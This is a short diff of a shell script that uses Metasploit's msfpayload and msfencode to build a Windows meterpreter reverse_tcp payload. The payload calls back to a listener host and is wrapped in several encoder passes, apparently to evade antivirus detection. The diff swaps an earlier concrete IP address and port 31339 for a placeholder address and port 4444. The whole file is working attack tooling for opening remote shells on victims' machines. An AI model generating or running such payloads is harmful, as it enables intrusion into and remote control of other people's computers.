@@ -1,6 +1,6 @@
 cd /usr/share/metasploit-framework/
-IP='76.182.55.45'
-port='31339'
+IP='00.0.000.00'
+port='4444'
 enumber='3'
 seed='400'
 ./msfpayload windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$port EXITFUNC=process R | ./msfencode -e x86/shikata_ga_nai -c $enumber -t raw | ./msfencode -e x86/jmp_call_additive -c $enumber -t raw | ./msfencode -e x86/call4_dword_xor -c $enumber -t raw |  ./msfencode -e x86/shikata_ga_nai -c $enumber  > test.c 
